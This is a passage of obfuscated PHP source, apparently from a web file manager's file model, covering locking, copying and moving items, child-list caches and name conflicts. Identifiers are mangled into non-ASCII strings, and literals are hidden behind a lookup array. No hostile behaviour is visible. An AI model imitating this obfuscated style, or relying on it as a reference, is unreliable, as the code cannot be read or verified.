array($´ŸÛÏ½˜[564], $´ŸÛÏ½˜[565]), $­•ò¯™Î); $this->_lockParent($°ÊÎÈ‹, array($´ŸÛÏ½˜[564], $´ŸÛÏ½˜[566]), $­•ò¯™Î); $this->_lockEvent($°ÊÎÈ‹, array($´ŸÛÏ½˜[571], $´ŸÛÏ½˜[567], $´ŸÛÏ½˜[568]), $­•ò¯™Î); $this->_lockCheckEnd($´ŸÛÏ½˜[566], $°ÊÎÈ‹); } public function lockMoveEnd($¸Ô•‹‡ç) { $†ï¥•ôÀ =& $_SERVER[ñ÷§¡å]; if (!$this->allowLock()) { return; } $—Óíâ˜é = 0; $this->_lockKey($†ï¥•ôÀ[570] . $¸Ô•‹‡ç, $—Óíâ˜é); $this->_lockEvent($¸Ô•‹‡ç, array($†ï¥•ôÀ[564], $†ï¥•ôÀ[565]), $—Óíâ˜é); $this->_lockParent($¸Ô•‹‡ç, array($†ï¥•ôÀ[564], $†ï¥•ôÀ[566]), $—Óíâ˜é); $this->_lockEvent($¸Ô•‹‡ç, array($†ï¥•ôÀ[571], $†ï¥•ôÀ[567], $†ï¥•ôÀ[568]), $—Óíâ˜é); } private function _lockCheck($×Í³„¶¿, $áóÌÚßı) { $—ÎÎ£Óè =& $_SERVER[ñ÷§¡å]; $øÀ×ó = $this->sourceInfo($áóÌÚßı); $ì½£¿ö§ = $×Í³„¶¿ . $—ÎÎ£Óè[10] . $áóÌÚßı; $this->_lockTimeStart[$ì½£¿ö§] = timeFloat(); if (!is_array($øÀ×ó)) { return; } $ÌàµŒè¬ = LNG($—ÎÎ£Óè[572]); CacheLock::setErrorMsg($—ÎÎ£Óè[172] . htmlspecialchars($øÀ×ó[$—ÎÎ£Óè[32]]) . $—ÎÎ£Óè[174] . $ÌàµŒè¬); $this->_lockKey($ì½£¿ö§, 1); $this->_lockKey($ì½£¿ö§, 0); $…¯¸¬Ş¸ = array_reverse($this->parentLevelArray($øÀ×ó[$—ÎÎ£Óè[530]])); foreach ($…¯¸¬Ş¸ as $Ê©¡Òıó) { $ì½£¿ö§ = $×Í³„¶¿ . $—ÎÎ£Óè[573] . $Ê©¡Òıó; if (CacheLock::lockGet($—ÎÎ£Óè[574] . $ì½£¿ö§)) { $øÀ×ó = $this->sourceInfo($Ê©¡Òıó); CacheLock::setErrorMsg($—ÎÎ£Óè[172] . htmlspecialchars($øÀ×ó[$—ÎÎ£Óè[32]]) . $—ÎÎ£Óè[174] . $ÌàµŒè¬); $this->_lockKey($ì½£¿ö§, 1); $this->_lockKey($ì½£¿ö§, 0); } } } private function _lockCheckEnd($ı¯Ò÷˜û, $×Ó“ñ‡ò) { $š‡’ï½ñ =& $_SERVER[ñ÷§¡å]; $Îáîä†í = $ı¯Ò÷˜û . $š‡’ï½ñ[10] . $×Ó“ñ‡ò; CacheLock::setErrorMsg($š‡’ï½ñ[387]); if (!isset($this->_lockTimeStart[$Îáîä†í])) { return; } $“¥­ÁÑ = timeFloat() - $this->_lockTimeStart[$Îáîä†í]; unset($this->_lockTimeStart[$Îáîä†í]); if ($“¥­ÁÑ > 0.5) { unset(self::$cacheSourceInfo[$š‡’ï½ñ[469] . $×Ó“ñ‡ò]); } $ÚçıİÜ = $this->sourceInfo($×Ó“ñ‡ò); if (!$ÚçıİÜ) { show_json(LNG($š‡’ï½ñ[115]), !1); } } private function _lockParent($Î©²Üòå, $°úú¹äµ, $èš¬È‡Ó) { if (!$this->autoLockSet) { return; } $“ÔÒÁ¢‹ = $this->sourceInfo($Î©²Üòå); if (!is_array($“ÔÒÁ¢‹)) { return; } $„  ¾´ = array_reverse($this->parentLevelArray($“ÔÒÁ¢‹[$_SERVER[ñ÷§¡å][530]])); foreach ($„  ¾´ as $®Œ±öô) { $this->_lockEvent($®Œ±öô, $°úú¹äµ, $èš¬È‡Ó); } } private function _lockEvent($Ûù˜©Š„, $ôù»Ûû·, $Å€Ÿ›­Ÿ) { $Îßé¯–½ =& $_SERVER[ñ÷§¡å]; if (!$this->autoLockSet) { return; } foreach ($ôù»Ûû· as $º¯± ãú) { $ˆÑìË³¹ = $º¯± ãú . $Îßé¯–½[10] . $Ûù˜©Š„; if ($Å€Ÿ›­Ÿ && CacheLock::lockGet($Îßé¯–½[574] . $ˆÑìË³¹)) { continue; } $this->_lockKey($ˆÑìË³¹, $Å€Ÿ›­Ÿ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ë¥¶ı‰®, $ƒ¸™åÆƒ = 1) { $×çßÒÁı = $_SERVER[ñ÷§¡å][574] . md5($ë¥¶ı‰®); if ($ƒ¸™åÆƒ) { if (isset(self::$_lockItemArr[$×çßÒÁı])) { return; } self::$_lockItemArr[$×çßÒÁı] = 1; CacheLock::lock($×çßÒÁı, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$×çßÒÁı])) { return; } unset(self::$_lockItemArr[$×çßÒÁı]); CacheLock::unlock($×çßÒÁı); } } public function isParentOf($øç¤Û°Ø, $×ƒÆí ) { $ÎøöÒìŠ =& $_SERVER[ñ÷§¡å]; $º™Êäµ× = $this->sourceInfo($øç¤Û°Ø); $Ü·©Äš§ = $this->sourceInfo($×ƒÆí ); $Ü°·”€’ = $º™Êäµ×[$ÎøöÒìŠ[530]] . $º™Êäµ×[$ÎøöÒìŠ[411]] . $ÎøöÒìŠ[50]; $«òˆº‡ = $Ü·©Äš§[$ÎøöÒìŠ[530]] . $Ü·©Äš§[$ÎøöÒìŠ[411]] . $ÎøöÒìŠ[50]; $ò·€€÷’ = strpos($«òˆº‡, $Ü°·”€’) === 0; return $ò·€€÷’; } private $targetIsDelete = 0; public function copy($øõñé¨÷, $Ê¯ıë¼×, $•é•Ç = REPEAT_REPLACE, $ÉÓ ÖÜ = '') { $Õôñ”˜ =& $_SERVER[ñ÷§¡å]; $É†ûûı€ = $this->sourceInfo($øõñé¨÷); $œ½åÇÛ› = $this->sourceInfo($Ê¯ıë¼×); if (!$É†ûûı€ || !$œ½åÇÛ› || $œ½åÇÛ›[$Õôñ”˜[419]] != $Õôñ”˜[98]) { return !1; } if ($this->isParentOf($øõñé¨÷, $Ê¯ıë¼×)) { return !1; } $ø®ãö¥ı = $ÉÓ ÖÜ ? $ÉÓ ÖÜ : $É†ûûı€[$Õôñ”˜[32]]; $this->lockCopyStart($øõñé¨÷); $this->lockWriteStart($Ê¯ıë¼×, $ø®ãö¥ı); $ïÂ‰â‰Æ = array($Õôñ”˜[575] => array(), $Õôñ”˜[576] => array(), $Õôñ”˜[577] => array()); $this->targetIsDelete = intval($É†ûûı€[$Õôñ”˜[440]]); $ÖàÆü§š = $this->fileNameExistCache($Ê¯ıë¼×, $É†ûûı€[$Õôñ”˜[32]]); $¸Àƒ¼Úò = $this->_copy($øõñé¨÷, $Ê¯ıë¼×, $•é•Ç, $ïÂ‰â‰Æ, !0, $ÉÓ ÖÜ); $this->_childrenListClear(); $this->lockCopyEnd($øõñé¨÷); $this->lockWriteEnd($Ê¯ıë¼×, $ø®ãö¥ı); if ($É†ûûı€[$Õôñ”˜[419]] == $Õôñ”˜[98] && $ÖàÆü§š == $¸Àƒ¼Úò) { $this->folderSizeResetChildren($ÖàÆü§š); } Model($Õôñ”˜[578])->addAll($ïÂ‰â‰Æ[$Õôñ”˜[576]], array(), !0); if ($ÖàÆü§š != $¸Àƒ¼Úò || $É†ûûı€[$Õôñ”˜[419]] == $Õôñ”˜[98]) { Model($Õôñ”˜[579])->eventCopy($¸Àƒ¼Úò); } $this->saveAll($ïÂ‰â‰Æ[$Õôñ”˜[577]]); Model($Õôñ”˜[209])->linkAdd($ïÂ‰â‰Æ[$Õôñ”˜[575]]); $this->folderSizeReset($Ê¯ıë¼×); $this->updateModifyTime($Ê¯ıë¼×); return $¸Àƒ¼Úò; } private function _copy($ª¢î«Ÿ, $È¨µ…ö, $²„¿ë÷, &$ˆºÊŸå, $çâŒàñĞ, $Ô‹­ùË = '') { $şÈÖØ„Å =& $_SERVER[ñ÷§¡å]; $¨î”×Ñ = $this->sourceInfoCache($ª¢î«Ÿ); $õÄÈˆ¤ = $¨î”×Ñ[$şÈÖØ„Å[419]] == $şÈÖØ„Å[98]; $–˜É†¢ä = $Ô‹­ùË ? $Ô‹­ùË : $¨î”×Ñ[$şÈÖØ„Å[32]]; $œ¤üÛ› = $this->fileNameExistCache($È¨µ…ö, $–˜É†¢ä); if ($çâŒàñĞ) { $this->_childrenAllMake($ª¢î«Ÿ); if ($õÄÈˆ¤ && $œ¤üÛ›) { $this->_childrenAllMake($œ¤üÛ›); } } if (!$œ¤üÛ›) { return $this->_copyCreate($ª¢î«Ÿ, $È¨µ…ö, $–˜É†¢ä, $ˆºÊŸå); } $¶ç®©æí = $œ¤üÛ›; if ($õÄÈˆ¤) { if ($²„¿ë÷ == REPEAT_RENAME_FOLDER) { $–˜É†¢ä = $this->fileNameAutoCache($È¨µ…ö, $–˜É†¢ä, $²„¿ë÷, $õÄÈˆ¤); $¶ç®©æí = $this->_copyCreate($ª¢î«Ÿ, $È¨µ…ö, $–˜É†¢ä, $ˆºÊŸå); } else { $¢Èâôä = $this->_childrenList($ª¢î«Ÿ); foreach ($¢Èâôä as $ŸÀ›´ˆÃ) { $this->_copy($ŸÀ›´ˆÃ[$şÈÖØ„Å[411]], $œ¤üÛ›, $²„¿ë÷, $ˆºÊŸå, !1); } } } else { if ($²„¿ë÷ == REPEAT_RENAME || $²„¿ë÷ == REPEAT_RENAME_FOLDER) { $–˜É†¢ä = $this->fileNameAutoCache($È¨µ…ö, $–˜É†¢ä, $²„¿ë÷, $õÄÈˆ¤); $¶ç®©æí = $this->_copyCreate($ª¢î«Ÿ, $È¨µ…ö, $–˜É†¢ä, $ˆºÊŸå); } else { if ($²„¿ë÷ == REPEAT_REPLACE) { $üÏ°¦¹ = $this->sourceInfoCache($œ¤üÛ›); $Øíşüş = $this->fileHistory($üÏ°¦¹, $¨î”×Ñ[$şÈÖØ„Å[477]], $¨î”×Ñ[$şÈÖØ„Å[86]]); if ($Øíşüş) { $ˆºÊŸå[$şÈÖØ„Å[575]][] = $¨î”×Ñ[$şÈÖØ„Å[477]]; } } else { if ($²„¿ë÷ == REPEAT_SKIP) { } } } Hook::trigger($şÈÖØ„Å[580], array($şÈÖØ„Å[581], $¨î”×Ñ, 0)); } return $¶ç®©æí; } private function _copyCreate($·úá, $«»½ÚÉ, $÷Ö÷õÁ, &$…âÊäåæ) { $¿›™†Ñ± =& $_SERVER[ñ÷§¡å]; $ÌÓ·Ù±¥ = $this->sourceInfoCache($·úá); $¦“Å§èº = $this->sourceInfoCache($«»½ÚÉ); $¾”‡Æ« = $this->_makeItemData($ÌÓ·Ù±¥, $¦“Å§èº, $÷Ö÷õÁ); Hook::trigger($¿›™†Ñ±[582], $¾”‡Æ«); Hook::trigger($¿›™†Ñ±[583], array($¿›™†Ñ±[584], $¾”‡Æ«, 0)); $õ¿–ìù– = $this->add($¾”‡Æ«); $ÕŸ»¼öö = array($¿›™†Ñ±[411] => $õ¿–ìù–, $¿›™†Ñ±[32] => $÷Ö÷õÁ); $this->_copyApplyMeta($ÕŸ»¼öö, $…âÊäåæ); if ($ÌÓ·Ù±¥[$¿›™†Ñ±[419]] != $¿›™†Ñ±[98]) { $…âÊäåæ[$¿›™†Ñ±[575]][] = $ÌÓ·Ù±¥[$¿›™†Ñ±[477]]; return $õ¿–ìù–; } $«Û“ÃÃè = array(); $ÈÁÙ•Æï = array(); $this->_childrenListAll($·úá, $«Û“ÃÃè); $ï¥ˆ±Êç = count($«Û“ÃÃè); if ($ï¥ˆ±Êç == 0) { return $õ¿–ìù–; } $ÔîÜÃÖç = $this->sourceInfo($õ¿–ìù–); foreach ($«Û“ÃÃè as $éÑ°±¬Ã) { $şÜèùËÎ = $this->_makeItemData($éÑ°±¬Ã, $ÔîÜÃÖç, $éÑ°±¬Ã[$¿›™†Ñ±[32]]); $şÜèùËÎ[$¿›™†Ñ±[530]] = $éÑ°±¬Ã[$¿›™†Ñ±[530]]; $ÈÁÙ•Æï[] = $şÜèùËÎ; } $this->chunkEventSet($¿›™†Ñ±[585], array($¿›™†Ñ±[586], $¾”‡Æ«, $ï¥ˆ±Êç)); $this->addAll($ÈÁÙ•Æï, array(), !1); $°Áåâä» = $this->where(array($¿›™†Ñ±[441] => $õ¿–ìù–))->select(); $¬ÛÖ¼¿ğ = $this->_childrenMakeRelation($«Û“ÃÃè, $°Áåâä»); $¬ÛÖ¼¿ğ[$·úá] = $õ¿–ìù–; $³¥É„« = array(); $ø´Æ»ô¬ = array(); foreach ($°Áåâä» as $éÑ°±¬Ã) { $¸óäñĞ½ = $éÑ°±¬Ã[$¿›™†Ñ±[411]]; $á¢ëÖÉÏ = $this->_childrenMatch($¬ÛÖ¼¿ğ, $éÑ°±¬Ã, $ÔîÜÃÖç); $³¥É„«[] = array($¿›™†Ñ±[411], $¸óäñĞ½, $¿›™†Ñ±[441], $á¢ëÖÉÏ[$¿›™†Ñ±[441]]); $ø´Æ»ô¬[] = array($¿›™†Ñ±[411], $¸óäñĞ½, $¿›™†Ñ±[530], $á¢ëÖÉÏ[$¿›™†Ñ±[530]]); $this->_copyApplyMeta($éÑ°±¬Ã, $…âÊäåæ); if ($éÑ°±¬Ã[$¿›™†Ñ±[419]] != $¿›™†Ñ±[98]) { $…âÊäåæ[$¿›™†Ñ±[575]][] = $éÑ°±¬Ã[$¿›™†Ñ±[477]]; } } $this->chunkEventSet($¿›™†Ñ±[587], array($¿›™†Ñ±[588], $¾”‡Æ«, $ï¥ˆ±Êç)); $this->saveAll($³¥É„«); $this->chunkEventSet($¿›™†Ñ±[589], array($¿›™†Ñ±[590], $¾”‡Æ«, $ï¥ˆ±Êç)); $this->saveAll($ø´Æ»ô¬); return $õ¿–ìù–; } private function _childrenMakeRelation($‰Öğ¾¼, $ãÂıĞ¥) { $—­ÃÔÓá =& $_SERVER[ñ÷§¡å]; $ˆô¹ï€‰ = array(); $ãÀ¥šÔÆ = array(); foreach ($‰Öğ¾¼ as $¦§¬Ï´ô) { $æÆ¾áäÙ = $¦§¬Ï´ô[$—­ÃÔÓá[32]] . $—­ÃÔÓá[8] . $¦§¬Ï´ô[$—­ÃÔÓá[530]]; $ˆô¹ï€‰[$æÆ¾áäÙ] = $¦§¬Ï´ô[$—­ÃÔÓá[411]]; } foreach ($ãÂıĞ¥ as $¦§¬Ï´ô) { $æÆ¾áäÙ = $¦§¬Ï´ô[$—­ÃÔÓá[32]] . $—­ÃÔÓá[8] . $¦§¬Ï´ô[$—­ÃÔÓá[530]]; $×¶°”Ğ£ = $ˆô¹ï€‰[$æÆ¾áäÙ]; $ãÀ¥šÔÆ[$×¶°”Ğ£] = $¦§¬Ï´ô[$—­ÃÔÓá[411]]; } return $ãÀ¥šÔÆ; } private function _childrenMatch($€ÀóÂÊ¥, $‘Ê­”áÇ, $©ñ¸Øªç) { $Ä™Ú×ø =& $_SERVER[ñ÷§¡å]; $­Õ¥˜Ê§ = $©ñ¸Øªç[$Ä™Ú×ø[530]]; $¹Âš¥¾§ = $this->parentLevelArray($‘Ê­”áÇ[$Ä™Ú×ø[530]]); foreach ($¹Âš¥¾§ as $ìºÑ«) { if (isset($€ÀóÂÊ¥[$ìºÑ«])) { $­Õ¥˜Ê§ .= $€ÀóÂÊ¥[$ìºÑ«] . $Ä™Ú×ø[591]; } } $­Õ¥˜Ê§ = rtrim($­Õ¥˜Ê§, $Ä™Ú×ø[50]) . $Ä™Ú×ø[50]; $áÂõçíæ = $this->parentLevelArray($­Õ¥˜Ê§); $ñèã°Œñ = $áÂõçíæ[count($áÂõçíæ) - 1]; return array($Ä™Ú×ø[441] => $ñèã°Œñ, $Ä™Ú×ø[530] => $­Õ¥˜Ê§); } private function _makeItemData($Í‹áàúò, $µÅ»Œ¹É, $åâŒº«Ê) { $ÁñêÀÆ =& $_SERVER[ñ÷§¡å]; $®Æ«¹Ÿ = array($ÁñêÀÆ[592] => $Í‹áàúò[$ÁñêÀÆ[419]], $ÁñêÀÆ[429] => $åâŒº«Ê, $ÁñêÀÆ[593] => $Í‹áàúò[$ÁñêÀÆ[421]] ? $Í‹áàúò[$ÁñêÀÆ[421]] : $ÁñêÀÆ[12], $ÁñêÀÆ[478] => $Í‹áàúò[$ÁñêÀÆ[477]] ? $Í‹áàúò[$ÁñêÀÆ[477]] : 0, $ÁñêÀÆ[594] => $Í‹áàúò[$ÁñêÀÆ[86]] ? $Í‹áàúò[$ÁñêÀÆ[86]] : 0, $ÁñêÀÆ[595] => intval($µÅ»Œ¹É[$ÁñêÀÆ[420]]), $ÁñêÀÆ[596] => intval($µÅ»Œ¹É[$ÁñêÀÆ[514]]), $ÁñêÀÆ[597] => intval(USER_ID), $ÁñêÀÆ[598] => intval(USER_ID), $ÁñêÀÆ[410] => intval($µÅ»Œ¹É[$ÁñêÀÆ[411]]), $ÁñêÀÆ[599] => $µÅ»Œ¹É[$ÁñêÀÆ[530]] . $µÅ»Œ¹É[$ÁñêÀÆ[411]] . $ÁñêÀÆ[50], $ÁñêÀÆ[433] => $Í‹áàúò[$ÁñêÀÆ[95]] ? $Í‹áàúò[$ÁñêÀÆ[95]] : time(), $ÁñêÀÆ[439] => 0, $ÁñêÀÆ[600] => $ÁñêÀÆ[12]); return $®Æ«¹Ÿ; } private function _copyApplyMeta($Àßˆ©æö, &$Õã­Èäø) { $Öİ¼òğ² =& $_SERVER[ñ÷§¡å]; $Åö¨ÇÁ = $Àßˆ©æö[$Öİ¼òğ²[411]]; $›¯Õ¶  = $Àßˆ©æö[$Öİ¼òğ²[32]]; if (!isset($Àßˆ©æö[$Öİ¼òğ²[601]]) || !$Àßˆ©æö[$Öİ¼òğ²[601]] || $Àßˆ©æö[$Öİ¼òğ²[601]] == $Öİ¼òğ²[207]) { $Õã­Èäø[$Öİ¼òğ²[577]][] = array($Öİ¼òğ²[411], $Åö¨ÇÁ, $Öİ¼òğ²[601], short_id($Åö¨ÇÁ)); } if (Input::check($›¯Õ¶ , $Öİ¼òğ²[602])) { $Õã­Èäø[$Öİ¼òğ²[576]][] = array($Öİ¼òğ²[411] => $Åö¨ÇÁ, $Öİ¼òğ²[104] => $Öİ¼òğ²[474], $Öİ¼òğ²[383] => str_replace($Öİ¼òğ²[53], $Öİ¼òğ²[12], Pinyin::get($›¯Õ¶ ))); $Õã­Èäø[$Öİ¼òğ²[576]][] = array($Öİ¼òğ²[411] => $Åö¨ÇÁ, $Öİ¼òğ²[104] => $Öİ¼òğ²[473], $Öİ¼òğ²[383] => Pinyin::get($›¯Õ¶ , $Öİ¼òğ²[603])); } $Õã­Èäø[$Öİ¼òğ²[576]][] = array($Öİ¼òğ²[411] => $Åö¨ÇÁ, $Öİ¼òğ²[104] => $Öİ¼òğ²[453], $Öİ¼òğ²[383] => KodSort::makeStr($›¯Õ¶ )); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($–å¡à²Ì) { $£€¿“Ò— =& $_SERVER[ñ÷§¡å]; $Îèï„ÉË = $this->sourceInfo($–å¡à²Ì); $×®§é²Ê = $£€¿“Ò—[604]; $ º¦×€Ù = array($£€¿“Ò—[530] => array($£€¿“Ò—[559], $Îèï„ÉË[$£€¿“Ò—[530]] . $–å¡à²Ì . $£€¿“Ò—[560]), $£€¿“Ò—[440] => $this->targetIsDelete); $õ¯Òåñ = $this->field($×®§é²Ê)->where($ º¦×€Ù)->select(); if (!$õ¯Òåñ) { return; } $õ¯Òåñ = array_to_keyvalue($õ¯Òåñ, $£€¿“Ò—[411]); foreach ($õ¯Òåñ as $·ï—ğÂó) { $¡±¿‡¡… = $·ï—ğÂó[$£€¿“Ò—[441]]; $–å¡à²Ì = $·ï—ğÂó[$£€¿“Ò—[411]]; if (!isset($this->_childrenListCache[$–å¡à²Ì]) && $·ï—ğÂó[$£€¿“Ò—[419]] == $£€¿“Ò—[98]) { $this->_childrenListCache[$–å¡à²Ì] = array(); } if (!isset($this->_childrenListCache[$¡±¿‡¡…])) { $this->_childrenListCache[$¡±¿‡¡…] = array(); } $this->_childrenListCache[$¡±¿‡¡…][$–å¡à²Ì] = $·ï—ğÂó; $this->_childrenItemCache[$–å¡à²Ì] = $·ï—ğÂó; } } private function _childrenListAll($ÚîÑ÷½…, &$ƒê¦ˆ“) { $à¸‚È =& $_SERVER[ñ÷§¡å]; if (!isset($this->_childrenListCache[$ÚîÑ÷½…])) { return; } $§´¹İÕ… = $this->_childrenListCache[$ÚîÑ÷½…]; foreach ($§´¹İÕ… as $·¯Îı‘ü => $“…ŠŸƒ) { $ƒê¦ˆ“[$·¯Îı‘ü] = $“…ŠŸƒ; if ($“…ŠŸƒ[$à¸‚È[419]] == $à¸‚È[98]) { $this->_childrenListAll($·¯Îı‘ü, $ƒê¦ˆ“); } } } private function sourceInfoCache($ÔÊÂé‘Ò) { if (isset($this->_childrenItemCache[$ÔÊÂé‘Ò])) { return $this->_childrenItemCache[$ÔÊÂé‘Ò]; } return $this->sourceInfo($ÔÊÂé‘Ò); } private function _childrenList($¥êÊîÕş) { if (isset($this->_childrenListCache[$¥êÊîÕş])) { return $this->_childrenListCache[$¥êÊîÕş]; } return $this->_childrenListSelect($¥êÊîÕş); } private function _childrenListSelect($İ·¨¿šò) { $Ú¶…®›º =& $_SERVER[ñ÷§¡å]; $êÅÊ¸Åö = array($Ú¶…®›º[441] => $İ·¨¿šò, $Ú¶…®›º[440] => $this->targetIsDelete); $ßş‰±Èæ = $this->where($êÅÊ¸Åö)->select(); $ßş‰±Èæ = $ßş‰±Èæ ? $ßş‰±Èæ : array(); $»Ñ£³°È = array_to_keyvalue($ßş‰±Èæ, $Ú¶…®›º[411]); $this->_childrenListCache[$İ·¨¿šò] = $»Ñ£³°È; foreach ($»Ñ£³°È as $İ·¨¿šò => $›®±•­í) { $this->_childrenItemCache[$İ·¨¿šò] = $›®±•­í; } return $»Ñ£³°È; } private function fileNameExistCache($ïÒòÚ™¢, $úæ±Ğ) { $æ±õÃ™ =& $_SERVER[ñ÷§¡å]; $úæ±Ğ = strtolower($úæ±Ğ); $Æƒ‹¥Ğ = $this->_childrenList($ïÒòÚ™¢); foreach ($Æƒ‹¥Ğ as $«³ûØ‡Ğ) { if ($úæ±Ğ == strtolower($«³ûØ‡Ğ[$æ±õÃ™[32]])) { return $«³ûØ‡Ğ[$æ±õÃ™[411]]; } } return !1; } private function fileNameAutoCache($‡é›è€™, $Èö±ôÀ, $–÷ğŒŞ, $í­¼µÖ) { $ğàø¯Ì =& $_SERVER[ñ÷§¡å]; $Ï²¸î²Ò = $this->_childrenList($‡é›è€™); $¾””èË‘ = array_to_keyvalue($Ï²¸î²Ò, $ğàø¯Ì[12], $ğàø¯Ì[32]); return $this->fileNameAutoGet($¾””èË‘, $Èö±ôÀ, $–÷ğŒŞ, $í­¼µÖ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($çÇ©…Ô, $¢ÌÅÆ¶ã, $‚£®•×Š = REPEAT_REPLACE, $öÑâã÷¤ = '') { $ÃÍüÜÔİ =& $_SERVER[ñ÷§¡å]; $â‘öŒÄÈ = $this->sourceInfo($çÇ©…Ô); $êĞÇ÷ƒ = $this->sourceInfo($¢ÌÅÆ¶ã); if ($â‘öŒÄÈ[$ÃÍüÜÔİ[441]] == $êĞÇ÷ƒ[$ÃÍüÜÔİ[411]]) { if ($â‘öŒÄÈ[$ÃÍüÜÔİ[440]] == $ÃÍüÜÔİ[98]) { Model($ÃÍüÜÔİ[438])->restore(array($çÇ©…Ô)); } if (!$öÑâã÷¤ || $öÑâã÷¤ == $â‘öŒÄÈ[$ÃÍüÜÔİ[32]]) { return $çÇ©…Ô; } } $Ò¤ü‹¨ú = $this->pathInfoMore($çÇ©…Ô); if ($this->isParentOf($çÇ©…Ô, $¢ÌÅÆ¶ã)) { return !1; } if (!$â‘öŒÄÈ || !$êĞÇ÷ƒ || $êĞÇ÷ƒ[$ÃÍüÜÔİ[419]] != $ÃÍüÜÔİ[98]) { return !1; } Hook::trigger($ÃÍüÜÔİ[605], $Ò¤ü‹¨ú); $this->targetIsDelete = intval($â‘öŒÄÈ[$ÃÍüÜÔİ[440]]); if ($â‘öŒÄÈ[$ÃÍüÜÔİ[441]] == $¢ÌÅÆ¶ã && $öÑâã÷¤ != $â‘öŒÄÈ[$ÃÍüÜÔİ[32]]) { $‹ »ˆ›Ş = $this->fileNameExist($¢ÌÅÆ¶ã, $öÑâã÷¤); if ($‹ »ˆ›Ş && $â‘öŒÄÈ[$ÃÍüÜÔİ[419]] == $ÃÍüÜÔİ[207]) { $çé¨á°º = $this->sourceInfo($‹ »ˆ›Ş); $Ã³¬øı = $this->fileHistory($çé¨á°º, $â‘öŒÄÈ[$ÃÍüÜÔİ[477]], $â‘öŒÄÈ[$ÃÍüÜÔİ[86]]); if (!$Ã³¬øı) { Model($ÃÍüÜÔİ[480])->remove($â‘öŒÄÈ[$ÃÍüÜÔİ[477]]); } $this->removeNow($çÇ©…Ô, !1); $this->folderSizeReset($¢ÌÅÆ¶ã); Hook::trigger($ÃÍüÜÔİ[606], $Ò¤ü‹¨ú); return $‹ »ˆ›Ş; } } $­ùóšı÷ = $öÑâã÷¤ ? $öÑâã÷¤ : $â‘öŒÄÈ[$ÃÍüÜÔİ[32]]; $this->lockMoveStart($çÇ©…Ô); $this->lockWriteStart($¢ÌÅÆ¶ã, $­ùóšı÷); $Üâ©ªáà = array($ÃÍüÜÔİ[575] => array(), $ÃÍüÜÔİ[607] => !1); $this->clearShare($çÇ©…Ô, $¢ÌÅÆ¶ã); $‹¶±Ğ­™ = $this->fileNameExistCache($¢ÌÅÆ¶ã, $â‘öŒÄÈ[$ÃÍüÜÔİ[32]]); $®ŠÓßÀÌ = $this->_move($çÇ©…Ô, $¢ÌÅÆ¶ã, $‚£®•×Š, $Üâ©ªáà, $öÑâã÷¤); $this->sourceCacheClear(); if ($â‘öŒÄÈ[$ÃÍüÜÔİ[419]] == $ÃÍüÜÔİ[98] && $‹¶±Ğ­™) { $this->folderSizeResetChildren($®ŠÓßÀÌ); } Model($ÃÍüÜÔİ[209])->linkAdd($Üâ©ªáà[$ÃÍüÜÔİ[575]]); if ($‹¶±Ğ­™ && $Üâ©ªáà[$ÃÍüÜÔİ[607]]) { $this->removeNow($çÇ©…Ô, !1); } $this->lockMoveEnd($çÇ©…Ô); $this->lockWriteEnd($¢ÌÅÆ¶ã, $­ùóšı÷); $this->folderSizeReset($â‘öŒÄÈ[$ÃÍüÜÔİ[441]]); $this->folderSizeReset($¢ÌÅÆ¶ã); $½ÉÀŠ¿É = array($â‘öŒÄÈ[$ÃÍüÜÔİ[441]], $¢ÌÅÆ¶ã); if ($â‘öŒÄÈ[$ÃÍüÜÔİ[419]] == $ÃÍüÜÔİ[98]) { $½ÉÀŠ¿É[] = $çÇ©…Ô; } $this->updateModifyTime($½ÉÀŠ¿É); Model($ÃÍüÜÔİ[579])->eventMove($çÇ©…Ô, $â‘öŒÄÈ[$ÃÍüÜÔİ[441]], $¢ÌÅÆ¶ã); Hook::trigger($ÃÍüÜÔİ[606], $Ò¤ü‹¨ú); return $®ŠÓßÀÌ; } private function _move($öÉ—ŸÆ, $·©Êğ, $„Éº´úß, &$Şß’ó¸ñ, $©«êâìç = '') { $”ˆŸ÷À¸ =& $_SERVER[ñ÷§¡å]; $ê’‰ò€ø = $this->sourceInfo($öÉ—ŸÆ); $Â»É¾ = $ê’‰ò€ø[$”ˆŸ÷À¸[419]] == $”ˆŸ÷À¸[98]; $—ëÅÚ÷À = $©«êâìç ? $©«êâìç : $ê’‰ò€ø[$”ˆŸ÷À¸[32]]; $¢‘½İ¡à = $this->fileNameExistCache($·©Êğ, $—ëÅÚ÷À); $this->lockMoveStart($öÉ—ŸÆ); $this->lockWriteStart($·©Êğ, $—ëÅÚ÷À); if (!$¢‘½İ¡à) { return $this->_moveForce($öÉ—ŸÆ, $·©Êğ, $—ëÅÚ÷À); } $—ÅÔŠåı = $¢‘½İ¡à; $Ãú¼ñÕ = !1; if ($Â»É¾) { if ($„Éº´úß == REPEAT_RENAME_FOLDER) { $—ëÅÚ÷À = $this->fileNameAuto($·©Êğ, $—ëÅÚ÷À, $„Éº´úß, $Â»É¾); $—ÅÔŠåı = $this->_moveForce($öÉ—ŸÆ, $·©Êğ, $—ëÅÚ÷À); } else { if ($„Éº´úß == REPEAT_RENAME_FOLDER) { $„Éº´úß = REPEAT_RENAME; } $”øøÛæ¬ = $this->_childrenListSelect($öÉ—ŸÆ); foreach ($”øøÛæ¬ as $…¦”•½·) { $this->_move($…¦”•½·[$”ˆŸ÷À¸[411]], $¢‘½İ¡à, $„Éº´úß, $Şß’ó¸ñ); } $Ãú¼ñÕ = !0; } } else { if ($„Éº´úß == REPEAT_SKIP) { $Ãú¼ñÕ = !0; } else { if ($„Éº´úß == REPEAT_RENAME || $„Éº´úß == REPEAT_RENAME_FOLDER) { $—ëÅÚ÷À = $this->fileNameAuto($·©Êğ, $—ëÅÚ÷À, $„Éº´úß, $Â»É¾); $—ÅÔŠåı = $this->_moveForce($öÉ—ŸÆ, $·©Êğ, $—ëÅÚ÷À); } else { if ($„Éº´úß == REPEAT_REPLACE) { $›¥‚ıáó = $this->sourceInfoCache($¢‘½İ¡à); $ ¹¿°ë = $this->fileHistory($›¥‚ıáó, $ê’‰ò€ø[$”ˆŸ÷À¸[477]], $ê’‰ò€ø[$”ˆŸ÷À¸[86]]); $Ãú¼ñÕ = !0; if ($ ¹¿°ë) { $Şß’ó¸ñ[$”ˆŸ÷À¸[575]][] = $ê’‰ò€ø[$”ˆŸ÷À¸[477]]; } } } } } if 